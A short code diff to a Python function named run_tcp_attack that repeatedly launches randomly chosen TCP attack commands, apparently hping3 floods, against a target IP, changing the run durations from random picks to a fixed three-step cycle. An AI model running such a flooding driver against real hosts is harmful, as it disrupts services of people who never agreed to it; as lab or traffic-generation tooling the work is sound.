@@ -28,15 +28,19 @@ def run_tcp_attack(target_ip):
 # ])
 
     try:
+        i = 0 
         while True:
-            sleep_intervals = [random.randint(5, 15), random.randint(15, 60), random.randint(60, 90)]
-            random_sleep = random.choice(sleep_intervals)
+            sleep_intervals = [random.randint(5, 15), random.randint(15, 30), random.randint(35, 60)]
             random_attack = random.choice(tcp_attacks)
 
-            print(f"Executing: {random_attack} for {random_sleep} seconds...")
+            print(f"Executing: {random_attack} for {sleep_intervals[i]} seconds...")
             process = subprocess.Popen(random_attack, shell=True, preexec_fn=lambda: signal.signal(signal.SIGPIPE, signal.SIG_DFL))
 
-            time.sleep(random_sleep)
+            time.sleep(sleep_intervals[i])
+            i += 1
+            if i == 3:
+                i = 0
+
             process.terminate()
             process.wait()
             subprocess.call("killall hping3", shell=True)
